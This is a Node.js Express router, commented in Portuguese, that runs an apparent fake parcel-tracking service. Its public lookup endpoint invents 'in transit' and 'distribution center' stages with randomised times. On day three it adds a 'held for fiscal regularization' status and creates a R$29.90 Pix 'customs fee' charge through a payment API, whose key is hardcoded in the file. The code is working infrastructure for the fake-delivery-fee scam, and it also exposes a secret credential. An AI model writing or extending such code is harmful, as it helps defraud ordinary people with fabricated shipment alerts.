const express = require('express');
const router = express.Router();
const { getDB } = require('../db');
const axios = require('axios');

// Endpoint de configuração para o frontend
router.get('/config/centavos', (req, res) => {
    res.json({ active: true });
});

// ===== TRACKING API =====

// Listar todos (Admin) - Apenas o status mais recente de cada código único
router.get('/rastreios', async (req, res) => {
    const db = getDB();
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        const [rows] = await db.query(`
            SELECT t1.* 
            FROM rastreios_status t1
            INNER JOIN (
                SELECT codigo, MAX(id) as max_id 
                FROM rastreios_status 
                GROUP BY codigo
            ) t2 ON t1.id = t2.max_id
            ORDER BY t1.data DESC
        `);
        res.json(rows);
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Detalhes (Admin)
router.get('/rastreios/:codigo/detalhes', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        const [rows] = await db.query('SELECT * FROM rastreios_status WHERE codigo = ? ORDER BY data DESC', [codigo]);
        if (rows.length === 0) return res.status(404).json({ error: 'Rastreio não encontrado' });

        const latest = rows[0];
        res.json({
            codigo: latest.codigo,
            cidade: latest.cidade,
            data_inicial: latest.data,
            taxa_valor: latest.taxa_valor,
            taxa_pix: latest.taxa_pix,
            tipo_entrega: latest.tipo_entrega,
            taxa_paga: latest.taxa_paga,
            etapas: rows.map(r => r.status_atual),
            cliente_nome: null,
            cliente_whatsapp: null,
            cliente_notificar: false
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Criar
router.post('/rastreios', async (req, res) => {
    const db = getDB();
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        const { codigo, cidade, status_atual, taxa_valor, taxa_pix, tipo_entrega } = req.body;

        await db.query(
            'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
            [codigo, cidade, status_atual || '📦 Objeto postado', status_atual || '📦 Objeto postado', 'Seu objeto foi postado com sucesso.', taxa_valor, taxa_pix, tipo_entrega || 'NORMAL']
        );
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Atualizar
router.put('/rastreios/:codigo', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    const { cidade, taxa_valor, taxa_pix, tipo_entrega, etapas } = req.body;
    try {
        if (!db) throw new Error('Banco de dados não disponível');

        await db.query(
            'UPDATE rastreios_status SET cidade = ?, taxa_valor = ?, taxa_pix = ?, tipo_entrega = ? WHERE codigo = ?',
            [cidade, taxa_valor, taxa_pix, tipo_entrega, codigo]
        );

        if (Array.isArray(etapas)) {
            const [existingRows] = await db.query('SELECT status_atual FROM rastreios_status WHERE codigo = ?', [codigo]);
            const existingStatuses = existingRows.map(r => r.status_atual);

            for (const status of etapas) {
                if (!existingStatuses.includes(status)) {
                    await db.query(
                        'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega) VALUES (?, ?, ?, ?, ?, ?)',
                        [codigo, cidade, status, status, status, tipo_entrega]
                    );
                }
            }
            for (const oldStatus of existingStatuses) {
                if (!etapas.includes(oldStatus)) {
                    await db.query('DELETE FROM rastreios_status WHERE codigo = ? AND status_atual = ?', [codigo, oldStatus]);
                }
            }
        }

        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Deletar
router.delete('/rastreios/:codigo', async (req, res) => {
    const db = getDB();
    const { codigo } = req.params;
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        await db.query('DELETE FROM rastreios_status WHERE codigo = ?', [codigo]);
        res.json({ success: true });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Stats
router.get('/stats', async (req, res) => {
    const db = getDB();
    try {
        if (!db) throw new Error('Banco de dados não disponível');
        const [total] = await db.query('SELECT COUNT(DISTINCT codigo) as count FROM rastreios_status');
        const [entregues] = await db.query('SELECT COUNT(DISTINCT codigo) as count FROM rastreios_status WHERE status_atual LIKE "%Entregue%"');
        const [com_taxa] = await db.query('SELECT COUNT(DISTINCT codigo) as count FROM rastreios_status WHERE taxa_valor > 0');

        res.json({
            total: total[0].count,
            entregues: entregues[0].count,
            com_taxa: com_taxa[0].count,
            sem_taxa: total[0].count - com_taxa[0].count
        });
    } catch (error) {
        res.status(500).json({ error: error.message });
    }
});

// Public Search (Home & Tracking) com Automação
router.post(['/publico', '/consulta', '/rastreio-publico'], async (req, res) => {
    const db = getDB();
    try {
        console.log('--- NOVA BUSCA PÚBLICA ---');
        if (!db) throw new Error('Banco de dados não disponível');
        let { codigo } = req.body;
        if (!codigo) return res.status(400).json({ success: false, message: 'Código é obrigatório' });

        codigo = codigo.toUpperCase().trim();
        console.log(`Buscando código: ${codigo}`);

        const [rows] = await db.query(
            'SELECT * FROM rastreios_status WHERE UPPER(TRIM(codigo)) = ? ORDER BY data ASC',
            [codigo]
        );

        if (rows.length === 0) {
            console.log(`Código ${codigo} não encontrado.`);
            return res.status(404).json({ success: false, message: 'Código de rastreio não encontrado.' });
        }

        let packageData = rows[0];
        console.log(`Objeto encontrado. Etapas atuais: ${rows.length}`);

        // --- LÓGICA DE AUTOMAÇÃO DE ETAPAS ---
        const firstStageDate = new Date(rows[0].data);
        const now = new Date();
        const diffDays = Math.floor((now.getTime() - firstStageDate.getTime()) / (1000 * 60 * 60 * 24));
        const city = packageData.cidade;

        console.log(`Dias desde a postagem: ${diffDays} | Tipo: ${packageData.tipo_entrega} | Pago: ${packageData.taxa_paga}`);

        const automationStages = [
            { day: 1, status: '🚚 Em trânsito', title: '🚚 Em trânsito', sub: 'Seu objeto está sendo transportado entre unidades.' },
            { day: 2, status: '🏢 No centro de distribuição', title: '🏢 No centro de distribuição', sub: 'O objeto chegou na unidade de tratamento da sua região.' }
        ];

        // Adicionar etapas automáticas de trânsito
        for (const stage of automationStages) {
            if (diffDays >= stage.day && !rows.some(r => r.status_atual === stage.status)) {
                console.log(`Inserindo etapa automática: ${stage.status}`);
                const stageDate = new Date(firstStageDate);
                stageDate.setDate(stageDate.getDate() + stage.day);
                stageDate.setHours(9 + Math.floor(Math.random() * 8), Math.floor(Math.random() * 59));

                await db.query(
                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, tipo_entrega, taxa_paga, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?)',
                    [codigo, city, stage.status, stage.title, stage.sub, packageData.tipo_entrega, packageData.taxa_paga, stageDate]
                );
            }
        }

        // Se for NORMAL e passaram 3 dias e não está pago -> Taxa no Dia 3
        if (packageData.tipo_entrega === 'NORMAL' && diffDays >= 3 && !packageData.taxa_paga) {
            const taxaStatus = '⚠️ Objeto retido - Aguardando regularização fiscal';
            if (!rows.some(r => r.status_atual === taxaStatus)) {
                console.log('Condição de taxa atingida. Verificando PixGo...');

                let taxaPixEmv = packageData.taxa_pix || null;

                if (!taxaPixEmv) {
                    try {
                        const pixRes = await axios.post('https://pixgo.org/api/v1/payment/create', {
                            amount: 29.90,
                            description: `Taxa da Alfândega - ${codigo}`
                        }, {
                            headers: {
                                'x-api-key': 'pk_9073c62f8b397edc81e80d8675f6a6459916140064fbb2f3d653ba5b09dc9e3d',
                                'Content-Type': 'application/json'
                            },
                            timeout: 5000
                        });

                        if (pixRes.data && pixRes.data.success && pixRes.data.emv) {
                            taxaPixEmv = pixRes.data.emv;
                            console.log(`[PIXGO AUTO] Pix gerado para ${codigo}`);
                        }
                    } catch (pixErr) {
                        console.error('[PIXGO AUTO ERROR]', pixErr.response?.data || pixErr.message);
                    }
                }

                const taxaDate = new Date(firstStageDate);
                taxaDate.setDate(taxaDate.getDate() + 3);
                taxaDate.setHours(11 + Math.floor(Math.random() * 4), Math.floor(Math.random() * 59));

                await db.query(
                    'INSERT INTO rastreios_status (codigo, cidade, status_atual, titulo, subtitulo, taxa_valor, taxa_pix, tipo_entrega, data) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
                    [codigo, city, taxaStatus, taxaStatus, 'Seu objeto está sujeito a retenção por irregularidade fiscal. Regularize para liberar.', 29.90, taxaPixEmv, 'NORMAL', taxaDate]
                );
            }
        }

        // Recarregar rows se algo foi inserido
        const [updatedRows] = await db.query('SELECT * FROM rastreios_status WHERE UPPER(TRIM(codigo)) = ? ORDER BY data ASC', [codigo]);
        const currentRows = updatedRows;
        if (currentRows.length === 0) throw new Error('Erro ao recarregar dados após atualização');

        const lastStatus = currentRows[currentRows.length - 1];
        packageData = currentRows[0];

        const taxaRow = currentRows.find(r => (r.taxa_valor && parseFloat(r.taxa_valor) > 0) || r.taxa_pix);

        console.log('Preparando resposta JSON...');
        const responseData = {
            success: true,
            codigo: lastStatus.codigo,
            status_atual: lastStatus.status_atual,
            etapas: currentRows.map(r => ({
                titulo: r.titulo || r.status_atual,
                subtitulo: r.subtitulo || '',
                data: r.data,
                status_atual: r.status_atual
            })),
            taxa_valor: packageData.taxa_paga ? null : (taxaRow?.taxa_valor || null),
            taxa_pix: packageData.taxa_paga ? null : (taxaRow?.taxa_pix || null),
            tipo_entrega: packageData.tipo_entrega,
            taxa_paga: packageData.taxa_paga ? true : false
        };

        console.log('Enviando resposta com sucesso.');
        res.json(responseData);
    } catch (error) {
        console.error('--- ERRO CRÍTICO NA BUSCA ---');
        console.error(error);
        res.status(500).json({ success: false, error: 'Internal Server Error', message: error.message });
    }
});

module.exports = router;
